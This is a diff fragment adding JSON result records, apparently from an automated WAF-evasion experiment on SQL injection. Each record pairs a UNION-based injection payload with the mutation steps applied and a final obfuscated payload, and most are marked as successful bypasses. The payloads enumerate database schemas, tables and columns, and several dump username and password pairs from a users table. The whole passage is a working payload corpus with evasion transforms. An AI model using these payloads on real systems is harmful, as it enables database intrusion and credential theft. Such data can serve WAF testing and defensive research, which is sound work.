+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUniON%0aDISTINCT%0asElEcT%0a(seleCt%0aJSON_ARRAYAGG(schema_name)%0afroM%0aiNformATIoN_ScHEmA.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0160",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunIoN%0aDISTINCTROW%0aSeLEct%0a(sElecT%0aJSON_ARRAYAGG(schema_name)%0afRoM%0aInfORmatIon_sCHEmA.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0161",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auniON%0asELeCt%0a(sElect%0aJSON_ARRAYAGG(schema_name)%0aFrOM%0aInfoRmatIOn_SchEmA.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0162",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auniOn%0aALL%0aSEleCT%0a(SELeCt%0aJSON_ARRAYAGG(schema_name)%0afRom%0aINForMATioN_ScheMA.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0163",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aunIOn%0aDISTINCT%0aseLEcT%0a(SelEcT%0aJSON_ARRAYAGG(schema_name)%0aFROm%0aINForMaTION_sChEMa.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0164",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUnION%0aDISTINCTROW%0asELeCt%0a(sEleCt%0aJSON_ARRAYAGG(schema_name)%0aFroM%0aiNFORmATIOn_SChemA.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0165",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNIOn%0aselEcT%0a(sElEcT%0aJSON_ARRAYAGG(schema_name)%0aFroM%0aiNForMatiOn_scheMA.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0166",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUnION%0aALL%0aSeLeCT%0a(sElecT%0aJSON_ARRAYAGG(schema_name)%0aFRoM%0aInFORmAtiOn_sCheMa.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0167",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auniON%0aDISTINCT%0asElECT%0a(SelECt%0aJSON_ARRAYAGG(schema_name)%0aFrOM%0aInFOrMatIoN_SChEMa.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0168",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUnION%0aDISTINCTROW%0asELeCT%0a(seleCt%0aJSON_ARRAYAGG(schema_name)%0afrOM%0aInFORmAtIOn_scHeMa.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0169",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUnioN%0aseLECT%0a(sElect%0aJSON_ARRAYAGG(column_name)%0aFRoM%0ainfOrMAtiON_SChEMA.columns%0aWhERE%0aTaBLe_schema=dAtAbAsE%a0()%0aLImit%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0170",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUNioN%0aALL%0aSELEct%0a(selEcT%0aJSON_ARRAYAGG(column_name)%0afroM%0ainfoRMATion_SchemA.columns%0aWhERE%0aTable_schema=DaTABaSE%a0()%0aLimit%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0171",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0auNioN%0aDISTINCT%0aseLECt%0a(selECt%0aJSON_ARRAYAGG(column_name)%0aFroM%0ainForMaTiON_ScHemA.columns%0awhERE%0aTaBLE_schema=datAbAse%a0()%0aliMIt%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0172",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunioN%0aDISTINCTROW%0aseLECT%0a(SELeCt%0aJSON_ARRAYAGG(column_name)%0afroM%0aINfoRmAtiOn_SChema.columns%0awherE%0aTabLE_schema=datABAse%a0()%0aLiMit%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0173",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auniOn%0asELECt%0a(selECT%0aJSON_ARRAYAGG(column_name)%0afRom%0aINformatION_sChEmA.columns%0aWheRE%0ataBLE_schema=datABaSE%a0()%0aLImit%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0174",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUNiON%0aALL%0aseleCT%0a(SeLeCT%0aJSON_ARRAYAGG(column_name)%0afroM%0aiNFormatiOn_sCHEma.columns%0aWHerE%0aTAbLe_schema=dATabASE%a0()%0alIMit%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0175",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUniON%0aDISTINCT%0asElECt%0a(SeLEcT%0aJSON_ARRAYAGG(column_name)%0afRoM%0aInformATIOn_sCHema.columns%0awheRE%0aTAbLe_schema=DaTaBASe%a0()%0aLIMiT%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0176",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNion%0aDISTINCTROW%0aSeleCT%0a(sEleCT%0aJSON_ARRAYAGG(column_name)%0aFrOM%0aInfORMaTIOn_SCheMA.columns%0aWHErE%0aTAblE_schema=dAtABAsE%a0()%0aLIMIt%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0177",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNIOn%0aSelecT%0a(selEcT%0aJSON_ARRAYAGG(column_name)%0aFROm%0aiNfORmAtIoN_SCHeMa.columns%0aWHERE%0atAble_schema=dATabASe%a0()%0aLIMIt%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0178",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNIon%0aALL%0aSElECt%0a(SELEcT%0aJSON_ARRAYAGG(column_name)%0aFROm%0aiNfORmATiON_sChEma.columns%0aWheRe%0aTABLe_schema=DATabAsE%a0()%0alIMit%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0179",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNIoN%0aDISTINCT%0aseLeCt%0a(SELeCT%0aJSON_ARRAYAGG(column_name)%0aFRoM%0aINForMaTIon_SCHEma.columns%0awHere%0aTAblE_schema=dATabASe%a0()%0alimit%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0180",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 5),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNiOn%0aDISTINCTROW%0aSelECt%0a(SeLEct%0aJSON_ARRAYAGG(column_name)%0aFroM%0aInFORMATiON_SChema.columns%0aWHERE%0atablE_schema=DaTAbasE%a0()%0aLIMIT%0a5),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0181",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunION%0asELeCT%0a(sElECT%0aJSON_ARRAYAGG(CONCAT(username,CHAR(58),passwOrd))%0aFroM%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0182",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunioN%0aALL%0asElECt%0a(sEleCt%0aJSON_ARRAYAGG(CONCAT(username,CHAR(58),password))%0afRom%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0183",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0auniOn%0aDISTINCT%0asELEcT%0a(seleCt%0aJSON_ARRAYAGG(conCaT(username,CHAR(58),passwOrd))%0aFROm%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0184",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUniOn%0aDISTINCTROW%0aSELEct%0a(SELecT%0aJSON_ARRAYAGG(CoNcAt(username,CHAR(58),passwoRd))%0aFROm%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0185",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": false,
+      "final_payload": "-1'%0aUNIOn%0aSeLEct%0a(seLect%0aJSON_ARRAYAGG(concAT(username,CHAR(58),passwOrd))%0afRoM%0a`users`),'SEQSQLI_START','SEQSQLI_END'#",
+      "steps": 15,
+      "requests_used": 8,
+      "final_status": 403,
+      "final_result": "WAF_BLOCKED",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char"
+      ]
+    },
+    {
+      "payload_id": "u0186",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aunIon%0aALL%0aSELeCT%0a(SElEct%0aJSON_ARRAYAGG(CONCAT(username,CHAR(58),passwOrd))%0afrOm%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0187",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auniON%0aDISTINCT%0aSELect%0a(sElecT%0aJSON_ARRAYAGG(ConcaT(username,CHAR(58),passwOrd))%0afrom%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0188",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUNIoN%0aDISTINCTROW%0asELECt%0a(selEct%0aJSON_ARRAYAGG(cOnCat(username,CHAR(58),passwORd))%0aFRoM%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0189",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aunioN%0asElEct%0a(SELect%0aJSON_ARRAYAGG(CONCAT(username,CHAR(58),passwoRd))%0afROm%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0190",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUnIoN%0aALL%0asElect%0a(sElECT%0aJSON_ARRAYAGG(CONCAT(username,CHAR(58),passwOrd))%0afroM%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0191",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNIOn%0aDISTINCT%0aseleCT%0a(selecT%0aJSON_ARRAYAGG(cOnCaT(username,CHAR(58),password))%0aFrOm%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0192",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(username,0x3a,password) FROM users),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aunioN%0aDISTINCTROW%0aseLecT%0a(seLect%0aJSON_ARRAYAGG(cOncAT(username,CHAR(58),passwORd))%0afRoM%0a`users`),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0193",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0auNioN%0aSeLECt%0a(sEleCT%0aJSON_ARRAYAGG(CONCAT(tabLe_schema,CHAR(46),TabLe_name))%0afROM%0a`INFOrMAtiOn_sCHEma`.`tABLEs`%0awHerE%0atabLE_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0194",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0auniOn%0aALL%0aseLEct%0a(SElecT%0aJSON_ARRAYAGG(CONCAT(tAble_schema,CHAR(46),tablE_name))%0aFROM%0a`INFORmATioN_SchemA`.`taBles`%0aWHeRE%0aTaBLE_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0195",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0auNION%0aDISTINCT%0aSeLecT%0a(SelECT%0aJSON_ARRAYAGG(concat(tABlE_schema,CHAR(46),tAbLe_name))%0aFroM%0a`iNfOrMaTiOn_schEMA`.`TaBles`%0aWHeRe%0atABlE_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "ident_backtick",
+        "agg_swap",
+        "hex_to_char",
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0196",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) FROM information_schema.tables WHERE table_schema NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61)),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUnIOn%0aDISTINCTROW%0aselECt%0a(selEct%0aJSON_ARRAYAGG(concat(tAbLe_schema,CHAR(46),taBlE_name))%0afrom%0a`INFOrmaTIOn_sChEMA`.`TablEs`%0aWHeRE%0aTABLe_schema%0aNOT%0aIN%0a(CHAR(105,110,102,111,114,109,97,116,105,111,110,95,115,99,104,101,109,97),CHAR(109,121,115,113,108),CHAR(112,101,114,102,111,114,109,97,110,99,101,95,115,99,104,101,109,97))),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 7,
+      "requests_used": 7,
+      "final_status": 200,
